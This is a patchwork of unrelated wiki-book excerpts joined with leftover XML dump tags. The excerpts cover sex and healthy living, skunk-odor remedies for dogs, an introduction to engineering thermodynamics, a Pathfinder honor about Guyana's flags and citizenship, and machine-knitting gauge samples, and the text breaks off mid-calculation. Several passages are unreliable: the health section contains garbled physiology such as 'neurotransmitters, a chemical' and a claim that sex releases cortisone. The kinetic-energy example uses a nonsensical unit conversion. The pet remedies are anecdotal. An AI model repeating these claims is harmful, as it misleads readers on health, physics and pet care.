== Does an overall healthy lifestyle, including mental health, impact your sex life? ==

Better, healthier, and more satisfying sex can be obtained through an
overall healthier lifestyle.  Diet and exercise in addition to
healthy life choices serves as the prescription for a healthier sex
life.  Not only physical health, but mental health is a factor when
obtaining a satisfying sex life.

A positive mental attitude is a great way to boost your sexual
confidence and obtain the desired sex life that you want. Mental
health can alter your sex life dramatically, whether you are the type
of person with a positive attitude or a person that expresses a
negative attitude and self esteem.  Positive attitude and overall
good self esteem improves a persons sex life.  A negative attitude
and poor self esteem will impact one's sex life in a negative way and
will result in an unsatisfying sex life.

Whether its hitting the gym or gaining that self confidence in other
ways, an overall healthy lifestyle that includes physical and mental
health is an excellent way to promote a positive sex life. Through
obtaining and keeping a physically and mentally healthy body, one
will experience more endurance sexually, more desire to have sex,
sexual confidence, among many other positive outcomes regarding their
sex life.  

In conclusion, an overall healthy lifestyle and positive mental
health will result in an improved overall healthy sex life.

== Hormones released during exercise ==

Exercise has a positive effect on your body that releases hormones that act as chemical messengers within the body. A few hormones that are released during exercise are the growth hormone, endorphins, testosterone, estrogen, epinephrine, insuline, and glucagon. The Growth hormone strengthens bones, tendons, ligaments, and cartilage. It also decreases use of glucose and increases use of fat as a fuel during exercise. This can help to reduce body fat and keep blood glucose at a normal level. By keeping the glucose at a normal level it allows us to exercise for a longer period of time. Endorphins are released to reduce tension and anxiety. Over time as you work out endorphins stay in your blood for a longer period of time. Another hormone releases is testosterone. Testosterone is an important hormone for both males and female to help increase basic metabolism. Testosterone also helps maintain muscle tone, strength, and volume. Estrogen is released in women to breakdown body fat and stores it to be used as fuel and to increase metabolism. Estrogen can elevate moods, and increases libido. Epinephrine increases the amount of blood the heart pumps and directs blood flow to where it’s needed. Epinephrine is also used to breakdown fat to use as fuel. Another hormone is insulin. Insulin is regulates blood levels of glucose and directs glucose, fatty acids, and amino acids into the cells. Lastly, Glucagon is released to raise blood levels of glucose when they are too low. It causes stored carbohydrates in the liver to be release into the blood stream to raise blood sugar to a more normal level. 


== Hormones released during sex ==

Have you ever wondered why you’re in a great mood after sex? Sex releases tension, relieves stress, boosts our immune system, and is vital for a healthy heart and mind. Sex releases endorphins, which act as the body’s own pain reliever. Sex can also release cortisone, a chemical that acts as an anti-inflammatory. Not only does sex feel good, it produces neurotransmitters, a chemical that bonds people together emotionally. The secretion of these hormones produce feelings of enjoyment and relaxation. The feeling of love is created when the brain releases dopamine and nor epinephrine. These feelings create euphoria, the feeling of love. 

Sometimes during sexual intercourse, people may experience a severe headahce called a benign sex headache.  It occurs at the beginning of an orgasm in people whom have never had a neurological disorder.  It can be linked to the contractions of the muslces in the neck and head.  An increase in blood pressure happens during orgasm which could be the reason for experiencing a severe headache.  Benign sex headaches occur under stress, sleepiness, or after having sexual intercourse multiple times.  In a study conducted, almost half of people who had headaches during sex also had headaches while exercising.

== Does sex help in maintaining a healthy body similarly to exercise? ==

Sex as a form of exercise can significantly reduce the risk of the following conditions including, stroke, obesity, heart attack and other cardiovascular crises. Men that have reported to engage in sex three times a week are cutting their risk of heart attack in half. Another study was done over a span of two-thousand four hundred men in the town of Caerphilly of Wales as the number of times they had sex each week was recorded for ten year or five hundred and twenty week period. Again the statistics proved that the men we were more frequently engaged in sex were half as likely to suffer from a heart attack or stroke. The men who are engaging in sex at least three times per week are not necessarily healthier based on the physical benefits of the cardiovascular system but because there is also significant support about healthy interaction and positive social support in helping heart health. Research also supports that a brisk twenty minute walk can provide the same amount of health benefits that engaging in healthy sex three times per week does.

However, committing a level of adultery or promiscuity makes individuals more susceptible to having a life-ending stroke; according to a study in Japan. Also, taking medications for disorders such as depression, hypertension, hormone imbalances, ulcer medications, thyroid problems, diabetes, anxiety disorders, and some sleeping agents may lead to frustration in the bedroom as they may inhibit the natural sexual response system. Although the pharmaceutical companies have also began to pay attention to this matter. As a result they have designed drugs such as Cialis, or Viagra to help male stimulation and EROS-CTD for female stimulation.
  
Not only does exercise have a positive influence on sex but exercise has an equal benefit as it increases sexual desire. They certainly do go hand in hand. Exercise in conjunction with eating right and adequate sleep has been proven to boost the libido. For example, if a one-hundred and thirty pound person engages in sex for five minutes they can burn up to seven calories, also after two hours of sex they can burn off as much as one hundred and seventy calories. Overall, the relationship between sex and exercise can be exceptionally beneficial to each individual as it can decrease many health risks and provide an alternative exercise that many find enjoyable regardless of pre-existing health issues as there a many ways to compensate for the medications that hinder sexual response as described above.

      <comment>Oxy-clean for fabrics or even dog fur works if used with care</comment>
      <text xml:space="preserve">Besides the peroxide mixture, which when needed you may not have the necessary ingredients on hand, there is another very useful way to remove odor. I have used this method with great success.  My two dogs got sprayed by a skunk and since I did not have any peroxide in the house and it was late at night, I used this method and it worked!!

Wet the dog down with water and then pour bottled Pepsi, not diet -  regular Pepsi on the area or the whole dog if you do not where they have been sprayed.  Make sure they are soaked with the Pepsi.  I used the water first to make them wet so that their fur would absorb most of the Pepsi, then soaked them with a 2 liter bottle of Pepsi.  

Leave the Pepsi on for about 15 minutes.  I had the dog in the shower for this so I could keep them confined and let the Pepsi neutralize the skunk odor.  Then using dog shampoo and water, wash out the Pepsi.  If the dog still has a slight odor, you can repeat the procedure.  But it was amazing the Pepsi took out the smell. Some instructions tell you to shake the bottle so you can spray the Pepsi on, but I just poured it on the dog. It worked and most people will have Pepsi on hand.  I now keep two 2 litre bottles on hand for just that purpose.

== Oxy-Clean ==
Works too, on fabrics, furniture, car.. Even on the dog's fur, with one caveat.. The dog's fur will get a bit frizzy and might bleach a little. My black German Sheppard was a &quot;redhead&quot; for a few months. Just get it on the skunked area and leave it 10-15 minutes before bathing the dog. Do not use on face or eyes.
 
NEVER LET OXY-CLEAN OR ANY HARSH CHEMICALS ENTER THE DOG'S EYES</text>

      <text xml:space="preserve">The topic of thermodynamics is taught in Physics and Chemistry courses as part of the regular curriculum.
This book deals with Engineering Thermodynamics, where concepts of thermodynamics are used to solve engineering problems.
Engineers use thermodynamics to calculate the fuel efficiency of engines, and to find ways to make more efficient systems, be they rockets, refineries, or nuclear reactors.
One aspect of &quot;engineering&quot; in the title is that a lot of the data used is empirical (''e.g.'' steam tables), since you won't find clean algebraic equations of state for many common working substances.
Thermodynamics is the science that deals with transfer of heat and work.
Engineering thermodynamics develops the theory and techniques required to use empirical thermodynamic data effectively.
However, with the advent of computers most of these techniques are transparent to the engineer, and instead of looking data up in tables, computer applications can be queried to retrieve the required values and use them in calculations.
There are even applications which are tailored to specific areas which will give answers for common design situations.
But thorough understanding will only come with knowledge of underlying principles, and the ability to judge the limitations of empirical data is perhaps the most important gain from such knowledge.

This book is a work in progress.
It is hoped that as it matures, it will be more up to date than the dead tree editions.

Thermodynamics is the study of the relationships between HEAT (thermos) and WORK (dynamics). Thus, it deals with energy interactions in physical systems.  Classical thermodynamics can be stated in four laws called the zeroth, first, second, and third laws respectively. The ''laws'' of thermodynamics are empirical, ''i.e.'', they are deduced from experience, and supported by a large body of experimental evidence.

The first chapter is an introduction to thermodynamics, and presents the motivation and scope of the topic.
The second chapter, [[Engineering Thermodynamics/Thermodynamic Systems|Thermodynamic Systems]], defines some basic terms which are used throughout the book.
In particular, the concepts of system and processes are discussed.
The zeroth law is stated and the concept of temperature is developed.
The next chapter, [[Engineering Thermodynamics/First Law|First Law]], develops ideas required for the statement of the first law of thermodynamics.
[[Engineering Thermodynamics/Second Law|Second Law]] deals with heat engines and the concept of entropy.
[[Engineering Thermodynamics/Applications|Applications]] of the tools developed in the previous chapters are illustrated, including the use of thermodynamics in everyday engineering situations.
[[Engineering Thermodynamics/Appendix|Appendix]] gives a list of tables for some commonly used properties.

This course forms the foundation for the [[Heat Transfer]] course, where the ''rate'' and mechanisms of transmission of energy in the form of heat is studied.
The concepts will be used in further courses in heat, [[Internal Combustion Engines]], [[Refrigeration and Air Conditioning]], and [[Turbomachines]] to name a few.

      <text xml:space="preserve">== Introduction to Classical Thermodynamics ==
Thermodynamics is the study of energies. More specifically, introductory thermodynamics is the study of energy transfer in systems. Classical thermodynamics consists of methods and constructs that are used to “account” for macroscopic energy transfer. In fact, energy accounting is an appropriate synonym for classical thermodynamics. In much the same way that accountants balance money in and money out of a bank account, rocket scientists simply balance the energy in and out of a rocket engine. Of course just as a bank account’s balance is obfuscated by arcane devices such as interest rates and currency exchange, so too is thermodynamics clouded with seemingly difficult concepts such as irreversibility and enthalpy. But, also just like accounting, a careful review of the rules suggests a coherent strategy for maintaining tabs on a particular account.

If a statement about the simplicity of thermodynamics failed to convert would-be students, they may be captured with a few words on the importance of understanding energy transfer in our society. Up until about 150 years ago or so, the earth’s economy was primarily fueled by carbohydrates. That is to say, humans got stuff done by converting food, through a biological process, to fuel we could spend to do work (e.g. raise barns). This was a hindrance to getting things accomplished, because it turned out that most of that energy went to growing and cultivating more carbohydrates (e.g. crops and livestock). We won’t even talk about how much food the horses ate! 

Today, we have the luxury, primarily through an understanding of energy, to concentrate our energy production into efficient low maintenance operations. Massive power plants transfer energy to power tools for raising barns. Extremely efficient rocket engines tame and direct massive amounts of energy to blast TV satellites into orbit. This improvement in energy mastery frees humanity’s time to engage in more worthwhile activities such as watching cable TV. Although most are content to blissfully ignore the intricacies that command their way of life, I challenge you to embrace the contrary. 

By no means is the energy battle over. Understanding energy transfer and energy systems is the second step to overcoming the limits to what humanity can accomplish. The first step is commanding an interest in doing so from an inclined portion of the population. Given the reader (and editor) has read this far through this aggrandizing rhetoric, I welcome your interest and hope to see it continue until the end.

=== The Main Macroscopic Forms of Energy ===
It will be in the best interest of the reader to have defined energy before it is discussed further. There are three primary forms of energy that are discussed in macroscopic thermodynamics. Several other forms of energy exist, but they generally exist on a microscopic level and should be deferred to more advanced study. 

====Kinetic Energy====

The first form (probably most easily understood idea of energy) is defined by the motion of an object. Kinetic energy is the energy of a moving mass. For instance, a moving car will have more kinetic energy than a stationary car. The same car traveling at 60 km/h has more kinetic energy than it does traveling at 30 km/h. 

Kinetic Energy = (1/2) x (mass) x (velocity)&lt;sup&gt;2&lt;/sup&gt;

Ratio of v&lt;sub&gt;60&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; / v&lt;sub&gt;30&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; =((60)(1,000 meters/sec)(3600 sec/hour))&lt;sup&gt;2&lt;/sup&gt; / ((30)(1,000 meters/sec)(3,600 sec/hour))&lt;sup&gt;2&lt;/sup&gt;

So, once the algebra is completed properly we find the vehicle traveling at 60 km/h has four times the kinetic energy as when it is traveling at 30 km/h, while the vehicle has zero kinetic energy when it is stationary because the velocity = zero(0) results in 1/2mv&lt;sup&gt;2&lt;/sup&gt;(1/2*m*0=0) being zero.

====Potential Energy====

The second type of energy is called potential energy. Gravitational potential energy describes the energy due to elevation. A car at a height of 50 m has more potential energy than a car at a height of 25 m. This may be understood more easily if the car is allowed to drop from its height. On impact with the earth at 0 m, the car that initially rested at 50 m will have more kinetic energy because it was moving faster (allowed more time to accelerate). The idea that potential energy can convert to kinetic energy is the first idea of energy transfer. Transfers between kinetic and potential energy represent one type of account balance rocket scientists need be aware of.

Potential Energy = (mass)*(acceleration due to gravity)*(elevation with respect to reference line) .

====Internal Energy of Matter====

The third and most important concept of energy is reflected by temperature. The internal energy of matter is measured by its temperature. Hot water has more internal energy than the same amount of cold water. Internal energy is a measure of kinetic energy of the molecules and atoms that make up the substance. Since each atom or molecule is acting on its own accord, this internal energy is different from the bulk kinetic energy associated with the movement of the entire solid. The internal energy of matter is exhibited by molecular motion. The molecules of a gas at high temperature zip around their container constantly colliding with walls and other molecules. The molecules of a high temperature solid also move around a lot; however, since they are stuck together with other molecules, the most they can do is vibrate in place. 

In a nutshell, the above forms of energy are studied in classical thermodynamics. Those forms of energy are allowed to transfer among each other as well as in to or out of a system. Thermodynamics essentially provides some definitions for interpreting thermodynamic systems. It then goes on to define an important rule about fairly balancing energy and one rule about the quality of energy. (some energy is more valuable) Understanding the framework and the few rules that govern macroscopic thermodynamics proves to be an incredibly powerful set of tools for analyzing a myriad of not only engineering problems, but issues of practical concern.

|[[Image:Flag of Guyana.svg|thumb|300px|'''National Flag:''' The flag of Guyana, known as The Golden Arrowhead, was adopted in 1966. The colours are symbolic: green for agriculture and forests, white for rivers and water, gold for mineral wealth, black for endurance, and red for zeal and dynamism.]]
|[[Image:Pathfinderflag.jpg|thumb|300px|'''Pathfinder Flag:''' The Pathfinder flag is made from one of several materials, cotton bunting, rayon, or nylon. The flag is divided through the center both vertically and horizontally making four equal parts. The background colors are royal blue and white alternately sewed together with the upper left hand comer being royal blue. The Pathfinder emblem is centered in the heart of the background. The colors are descriptive of the purposes and ideals of Pathfindering. White means purity, blue means loyalty, red reminds us of the shed blood of Christ (sacrifice), and gold means excellence. The symbols also have meanings. The shield is the protection of God, the sword is his word, the Bible, and the triangle represents completeness. Completeness of the Godhead (Father, Son, and Holy Spirit), and completeness of the three parts of education (Mental, Physical, and Spiritual).]]

|[[Image:Ayflag.jpg|thumb|300px|'''AY Flag:''' The background is red and white, red symbolizing the blood of Christ and white representing purity. In the center, there is a logo that has AY which means Adventist Youth and it has three angels meaning the 3 angels message.]]
|[[Image:Christian flag.svg|thumb|300px|'''Christian Flag:''' The &quot;Christian Flag&quot; is a white flag with a blue canton and a red cross in it. It was designed by Charles Overton in 1897 to represent Protestants of all denominations. The cross symbolizes the crucifixion of Christ.]]

===Current state/provincial flags===
Guyana is divided into ten regions:
*Barima-Waini
* Cuyuni-Mazaruni
* Demerara-Mahaica
* East Berbice-Corentyne
* Essequibo Islands-West Demerara
* Mahaica-Berbice
* Pomeroon-Supenaam
* Potaro-Siparuni
* Upper Demerara-Berbice
* Upper Takutu-Upper Essequibo

&lt;!-- Find images of all the provincial flags of your country and put them here.  --&gt;
&lt;gallery&gt;




&lt;/gallery&gt;

==2. Know how to display the national flag with two other flags under the following situations: a. Camp out/camporee b. Fair c. Pathfinder Day program d. Parade==
==3. Demonstrate how to fold and salute your national flag. Mention when and how it should be displayed.==
===Folding===
#Have two people stand on either end of the flag, holding a corner in each hand.
#Fold the flag in half twice, length-wise.
#Beginning at the red end, fold one corner into the opposite side of the flag, forming a triangle.
#Repeat this triangular folding until only the top edge of the flag shows.
#Tuck this end into the triangle.
Be sure to keep the flag from touching the ground while folding.
===Flag Protocol===
==4. Explain the meaning of and reason for the National Anthem, and recite the words from memory. ==
==5. Give the rights and responsibilities of a citizen of your country. ==
===Rights===
===Responsibilities===
==6. Have an interview with a local, regional, or national official of your country, and learn about his duties. ==
It is generally easier to get a local official to agree to an interview, though it is often more exciting to interview a more prominent person.  The interview can be accomplished during a club meeting, and multiple Pathfinders can ask questions.  Invite your guest well ahead of time, and make sure everyone in the club is on time.  A visit by an official would be a very good reason to have everyone in the club wear their class A uniforms.  If desired, you can make up several questions ahead of time, writing them on index cards, and distributing them to the members of your club.  But do not be so rigid as to not allow them to ask spontaneous questions.  Having questions prepared ahead of time on index cards are a good way to get things rolling.  Here are some suggested questions:
* Could you describe a typical day at work?
* What is the most difficult part of your job?
* What is the most satisfying aspect of your job?
* To whom do you report?
* How did you get your position?  Were you elected, appointed, or hired?
* How should a young person prepare for a life of public service?

==7. Write a one-page essay or give a two-minute oral report about a famous person in your country. Mention what he has done to gain his recognition. ==
This would be an excellent opportunity to present a worship during the opening exercises of a regular club meeting.  Encourage your Pathfinder to choose a person they are personally interested in.  If they cannot think of anyone themselves, have a list of suggested persons at hand and encourage them to choose from the list.  Famous people might be historical figures, politicians, actors, sports stars, or anyone else.  It would be preferable to choose a person who has been a positive influence on the country.

Although the requirement asks that you &quot;mention what ''he'' has done to gain ''his'' recognition,&quot; this should not be interpreted as excluding women.  Men are not the ''only'' famous people in a country.

==8. Do one of the following ==
===a. Make a list of ten famous quotations from leaders of your country.===
===b. Make a list of ten famous historic places in your country. ===
===c. Make a list of ten famous historic events in your country.===
==9. Describe what you can do as a citizen to help your church and country. ==
The best way to help either your church or your country is by ''getting involved''.  Edmund Burke, an English philosopher summed this up when he said ''&quot;The only thing necessary for the triumph of evil is for good men to do nothing.&quot;''

In your church, this means that you will show up for services on a regular basis.  It also means you will support it with your tithes and offering, show up for business meetings, and not wait to be asked before you volunteer your services.  If you see something that needs done, ''do it.''  If you do not have the skill to do it, or you think that you need permission first, talk to your pastor, an elder, deacon, or deaconess.  Find your ministry!

For your country, it is much the same.  Show up for public meetings, stay informed about the issues of the day, vote if you are eligible, and pay your taxes fairly and promptly.

==10. Go through the steps of an individual acquiring citizenship in the country and learn how this is done. ==
==11. Know how to explain the process of government in your country. ==
==12. Explain the meaning of this statement Jesus made in Matthew 22:21: &quot;Render therefore unto Caesar the things which are Caesar's, and unto God the things that are God's. ==
This verse teaches that governmental authority is to be respected, as long as it does not conflict with the moral obligations of being a Christian.  Government serves a holy purpose; preserving social order, promoting the well-being of its citizens, and protecting their safety.  If you believe that this does not apply today because you see the government as corrupt, you are urged to research the Roman government of the first century A.D. when these words were spoken by Jesus.  Was Herod corrupt?  Was Pilate just?

==13. Explain why laws are established in your country. ==

==Making knitting samples==
If you are the owner of a knitting-machine, you should be able to make your own models; otherwise it will be very expensive, because you have to buy yarn with knitting models included. To get maximum pleasure out of your machine, you must not be dependent on bought patterns, but make them yourself. Therefore, this text is a guide showing how to make your patterns yourself, and how to calculate the yarn consumption. This can be done in a simple or a more sophisticated way. In any case it requires that you are able to:

# Take the correct measurements
# Actually obtain the correct garment sizes when you knit on your machine

The latter may not be easy. Machine-knitted materials do not act like those knitted by hand. You cannot measure while you are knitting, as the knitting is stretched out as long as it is fixed on the machine. The width depends on the distance between the needles and is not the same as the width of the swatch removed from the machine. Also, the length will be shorter when the knitting is stretched out on the machine, so you cannot use that either. Therefore, you will always have to make a sample with the yarn before starting the real knitting. But you cannot just make a sample, remove it from the machine, measure it at once, and then go on knitting right away based on these measurements.

If you measure the length as soon as you have removed the sample from the machine, it will be too short, and the actual garment will in the end become much too long, because you have measured too many rows per centimeter (cm) in the sample that had been stretched on the machine. Therefore, you will always have to stretch the sample lengthwise by hand and leave it until the next day, and let it find its final shape. But even so you may easily make errors. You may have stretched the sample too much, so that it now measures too few rows per cm. In most cases you have to measure the edges, where the sample is a little shorter, because it is tighter there. This is so unless you have used a casting-on comb and weights. In that case, the edge will get the same length as the rest of the knitting. On the other hand, there are cases when the sample should be measured along the midline. It depends on the material. Inelastic yarn, e.g. cotton, has to be measured in the middle.

The width is usually to be measured in the middle, but only after the sample has been stretched lengthwise and been left until the next day.

===Methods for casting on knitting samples===
1. If you have weaving brushes, activate them. Push the needles into knitting position and every other needle in resting position, but in such a way that they are included in the knitting (look in the machine instructions how to do this). Then thread the machine and put the thread across the needles, winding it a single turn around the first and the last needle. Set the row counter to 0. Hold the thread, and knit one row. Knit a few more rows before you inactivate the weaving brushes. Do not worry about the knitting rolling inwards, that will not do any harm, for it will correct itself when you have removed the sample and stretched it. You always finish off with approximately 4 to 5 rows of waste yarn of another color (contrast colored yarn). After that, you simply run the carriage across without yarn; thereby, the stitches will fall off. Later, when you measure the sample, you measure until the bottom of the first contrast colored stitch.

2. Another method is loose casting on with a thread through the stitches: Push the needles into knitting position and every other needle in resting position, turn on the idling and knit one row. Set the row counter to 0 and release the idling. Put a nylon thread or some other smooth thread inside the gate, hold both ends tightly with one hand, knit approximately 4 to 5 rows before pulling out the nylon thread, and go on with the knitting. When you measure the sample, you have to pull the beginning thread, which otherwise hangs in curves, and then measure from the first row up to the bottom of the first contrast colored stitch.

3. You may also start with a few rows of contrast colored yarn, followed by one row of nylon thread or some other smooth thread. In that case you measure from the bottom of the first ground color stitch, i.e. the color used for knitting the sample, until the bottom of the first contrast colored stitch. The smooth thread may be pulled out later.

===A procedure for making a plain knitted sample===
When you have decided which number on the tension dial you want to use, cast on 40 stitches without using comb or weights. Knit 60 rows and a few rows with waste yarn of another color. Then remove the knitting from the machine without casting off. Don't worry if the knitting rolls. You stretch it when you have removed it from the machine. Then roll it sideways into a sausage and stretch it. Unroll it, and leave it for about 24 hours. The next day you attach the edges of the sample with pins on an ironing board. It should be smoothed out without tightening. Then, measure the width across the middle with a precision of one millimeter (mm). The width is most easily measured with the wrongside up, because the edges tend to roll that way. After that, measure the length. This is easiest with the rightside up, because in that way it is easier to see where one stitch ends and another begins.

Having measured the knitting sample as precisely as possible, you are to calculate the numbers of stitches and rows per cm. There are 40 stitches, so you take a pocket calculator and divide 40 stitches by the figure giving the width in cm (with a precision of one decimal point). Write down the result. Then calculate the number of rows per cm in the same way by dividing 60 rows by the figure giving the length in cm. Write down this, too. If you have chosen a suitable stitch size, you will recognize that your result fits fairly well with the knitting tension indicated on the label collar of the yarn.

'''Example:''' You have a knitting sample with stitch size 7, 40 stitches and 60 rows. The width is 14.6 cm and the length 15.0 cm. You obtain the following ratios:

40 stitches / 14.6 cm = 2.74 stitches per cm.

60 rows / 15.0 cm = 4.0 rows per cm.

From now on, it is easy to multiply any measured width or length (in cm) with one of these ratio figures.

If the yarn is cotton, measure in the middle of the sample. Mixtures of cotton and acrylic are likewise measured in the middle. Samples of these yarns need not be left until the next day, but may be measured after about one hour. By the way, remember that cotton will shrink about 5 % when washed. Therefore, add 5 % to all measurements when knitting cotton. Also, if the label collar has the text &quot;shrink treated&quot; or &quot;shape stabilized&quot;, you may measure in the middle. You come across yarn with no such text on the label collar, but where it turns out that you have to measure in the middle anyway. The explanation for this must be that the factory has given the yarn some kind of treatment.

If, on the other hand, the yarn is wool or artificial material, you measure at the edge. However, not until you have stretched the edge a little (not too much). Hold out the beginning thread and measure from this up to the bottom of the first contrast color stitch. You have to attach the edge with pins all along. Below, at the beginning thread, the edge will curve a little. Do not straighten that curve, but measure straight along. If, instead, you measure in the middle, you attach with pins above and below at the middle of the sample. Here, you have to measure right from the bottom of the stitches up to the bottom of the first contrast colored stitch. To be able to take correct measurements, you must place the rightside up. Even if you do not use comb and weights for the knitting sample, you may still use them for the actual work, if you think it is easier to deal with in this way.

As to samples for pattern knitting: See chapter 8 on pattern knitting.

If the yarn you are using is a little too thick or somewhat hard to pull, you have to wax it. You do so by winding it on the yarn ball winder and at the same time letting it slide over a stump of stearin candle. A yarn ball winder is not always included when you buy a knitting-machine, but is practically indispensable. The waxed yarn runs more easily and gives a somewhat looser knitting. It will stretch further, so if you wax your yarn, you have to make the knitting sample with waxed yarn, too. Some machines are furnished with a piece of wax which can be put on the machine so that the yarn slides along it, but in my experience, this does not help enough.

==Knitleader==
Brother's knitleader is based on how much space 40 stitches and 60 rows take up. It is easy to use. If you have made your knitting sample as described above, you simply use the measurements of the sample. But if you only have stitch and row numbers per cm, you have to calculate the other way around: 40 stitches / (stitches per cm), 60 rows / (rows per cm).

ROYAL's knitleader is based on a knitting sample of 10 cm × 10 cm. If you have calculated stitch and row number per cm, you can just shift the decimal point. You need half size. Here it is very convenient to use chequered paper, with squares of 0.5 cm width, and then proceed as if one square were one cm. Then you draw the pattern with the measurements you need, and afterwards you put the roll of parchment paper on top and draw the pattern on that.

You see that the knitting sample is the basis of everything you make, whether you use a knitleader or just draw an outline to knit after.

If you have a sweater that fits you well, you can use its measurements and multiply by the ratios from your knitting sample.

If you want to follow a knitting pattern, you may in principle recalculate it according to your own knitting sample, as it is always indicated how many stitches there are to e.g. 10 cm, but rarely how many rows. Usually, only the height will be indicated in cm, and that may sometimes give you problems. Luckily, it has become more common to include a small drawing of the dress pattern with measurements.

==Expanded samples==
If you want to knit something fitting tightly to the body, say underwear, or leggings that must not take up much space, you have to use an expanded sample. Otherwise the knitting, which expands when you use it, will be too short. You put the sample e.g. on an ironing board, fix it with pins on one side, expand it e.g. 20 %, and pin it on the other side the whole way around. Then you can measure how many stitches and rows there now are per cm.

However, you must always also measure the sample before you expand it, for a knitting will rarely become expanded everywhere. There will usually be some parts where the knitting has to be dimensioned according to an ordinary sample.

==How to calculate the consumption of yarn==
If you want to know how much yarn you have to use, e.g. for a sweater, you must take some of the yarn, make a sample and find the area in cm&lt;sup&gt;2&lt;/sup&gt;. Weigh it on a letter-balance. Divide the weight in grams by the number of cm&lt;sup&gt;2&lt;/sup&gt; to get the weight per cm&lt;sup&gt;2&lt;/sup&gt;. The result will be 0.0...something grams.

Let us take the example of the acrylic sample referred to above. It measured 14.6 cm × 15 cm. Multiplying width with length gives us 219 cm&lt;sup&gt;2&lt;/sup&gt;. Then we remove the contrast colored yarn and weigh the sample. It weighs 6 grams. Now we divide the weight by the area:

6 g / 219 cm&lt;sup&gt;2&lt;/sup&gt; = 0.027 g per cm&lt;sup&gt;2&lt;/sup&gt;.

To find the area of the sweater, you first calculate the area of the body by multiplying the circumference (including as much extra width as you need) by the back length. To find the area of the sleeves, measure the upper arm circumference + wrist circumference (including the extra width) and multiply by the arm length from shoulder to wrist. If you had only one sleeve, you should divide the upper arm circumference + wrist circumference by 2 to get the average; but I suppose you have two sleeves. Add the two calculated areas, and you have the area of the whole sweater. Now you can multiply the whole area by the weight per cm&lt;sup&gt;2&lt;/sup&gt;, and this tells you how many grams of yarn you need. You had better calculate with a little extra yarn, as you use some more for the selvedge and neck edge, especially if you are using rib knitting.

Let us take an example: We have a remnant of the yarn referred to, and want to know if there is enough for a sweater for a 4 year old child. The chest circumference is 68 cm, and the length of the sweater is 39 cm.

68 cm × 39 cm = 2652 cm&lt;sup&gt;2&lt;/sup&gt;.

The upper arm circumference is 28 cm, the wrist circumference is 20 cm, the sleeve length is 37 cm.

28 cm + 20 cm = 48 cm.

48 cm × 37 cm = 1776 cm&lt;sup&gt;2&lt;/sup&gt;.

The body area 2652 cm&lt;sup&gt;2&lt;/sup&gt; + the sleeve area 1776 cm&lt;sup&gt;2&lt;/sup&gt; = 4428 cm&lt;sup&gt;2&lt;/sup&gt;. Weight per cm&lt;sup&gt;2&lt;/sup&gt; is 0.027 g.

0.027 g × 4428 cm&lt;sup&gt;2&lt;/sup&gt; = 119.56 g.

That is, we need 3 balls of 50 g each, or perhaps 2 balls plus a remnant. If there is not enough, you may have some other remnants which may be inserted as stripes or a pattern.

==Knitting samples with KNITTAX==
The KNITTAX machine is no longer sold, but as there are still many used machines around, I will nevertheless describe a method to make a knitting sample. It deviates in several respects from all other machines. Firstly, the needles have a different knitting position, the same as with intarsia carriages, however with the difference that the stitches sit behind the needle latches. This allows you to place the thread by hand, which by the way was necessary in the oldest machines. They had no yarn feeder at all. For the person who is interested in intarsia knitting, it is ideal, because it is the only machine that can knit intarsia knitting and colour patterns simultaneously. It does not do this automatically, but you may go empty back and fetch the next colour. Another difference is the platings which hold the knitting, so that you do not need weights. Weights do not exist for KNITTAX. This makes it easy to knit on. And, lastly, it has larger needle distance, about 5 mm.

When I was knitting on KNITTAX, I had to unpick everything three times. It would never fit. Finally I used to cast on 100 stitches and knit to the end of one yarn ball, pull it, and leave it until the next day. That made things fit approximately, but not completely. The knitting was always a little too large in both directions; the length was the most difficult to make fit. Not until I had knitted on other machines for several years and had experimented with knitting samples, did I find out a method, which may be a little awkward, but is nevertheless effective.

When I make the knitting sample, I put the thread by hand, and for every row I prevent it from going down around a plating at the edge. Thereby, the outermost needle is not knitted properly, but then I have to knit it manually. In this way I obtain the firm edge which is obtained in other machines if you do not use weights, and then, by measuring it after having stretched it, I get the correct length. As to the width, it has to be measured 1 - 2 cm below the contrast coloured yarn, provided that you have knitted 4 - 5 rows with contrast colour, and removed the stitches so that they stand loose. If you have a machine with a different needle distance and with a different casting off system than the Japanese machines, I will recommend that you experiment yourself with how to make the knitting samples. You may keep the knitting sample till you have knitted a complete piece, e.g. a back, that has been left for 24 hours, and then compare it with the knitting sample. Thereby you may learn something about where to measure the knitting sample.

==The ratio between stitches and rows==
It is a clever idea to realize what the ratio is between stitches per cm and rows per cm. In a normal, plain knitted sample, the ratio will be somewhere between 2 to 3 and 3 to 4. Henceforward, I will designate this as &quot;normal ratio between stitches and rows&quot;. It may fall a little outside without making any serious difference. But it matters when you are to increase or decrease the stitches, for instance if you are to decrease for an armhole, or slant a sleeve. So long as the ratio between stitches and rows is approximately the same, it does not matter whether you knit with thick or fine yarn, or what stitch size you use. The slants will be the same, and you can always decrease for an armhole in the same way, or increase or decrease with the same number of rows in between. This is especially important when you knit an arm cap, in the case that you sew in the sleeve. The same is true if you cast off a shoulder e.g. with 7 stitches at a time. This too can be done every time, as long as the ratio between stitches and rows is normal. If, on the other hand, there are many rows relative to the stitches, then there has to be greater intervals between the de- or increases, and fewer stitches are cast off at a time on the shoulder. In some pattern knittings there are more rows relative to stitches, e.g. tuck, and with colour patterns the opposite may be the case, especially if you knit with large stitch sizes. In that case you must have fewer rows between the de- and increases, and cast off more stitches at a time.

If your knitting is very tight, there are more rows relative to stitches, but then it has to be very marked before it is noticed. This applies maybe mainly to small stitch sizes below 5. The other way round, if you knit very loosely, the stitch and row numbers per cm will approach each other, for instance if you knit on every other needle even though the yarn is not thick.

If you cast on many stitches and knit few rows, e.g. on selvedges, the knitting will expand, whereby there will be fewer stitches and more rows to a cm. The other way round, if you cast on only few stitches and knit many rows, for instance for shoulder straps, belts or bands, the knitting will be pulled long and narrow, especially, of course, if you hang a weight on it.

If the ratio between stitches and rows deviates much from normal, it may be an indication that the measurements of the knitting sample are wrong. It could be that you have not left it long enough before you measured it, or forgotten to stretch it, but it could also be because you have knitted too loosely or too tightly. Especially, it may be difficult to knit with fine yarn with small stitch sizes. In this case it may be wise to make the sample larger. Knitting is something live, you see, and if you have not tried before to measure a knitting sample, it may be difficult. By checking the ratio between stitches and rows, you have a guiding principle. If you keep the knitting sample until you have knitted a complete piece, which has been left for 24 hours, then you may compare it with the knitting sample. If they differ a lot, then you must find out how you should have measured.

Here follow some examples of how to calculate the ratio between stitches and rows:

Pearl acrylic stitch size 7: stitches per cm: 2.74, rows per cm: 4.0.

Let us first try as 2 to 3.

We say 2.74 / 2 = 1.37

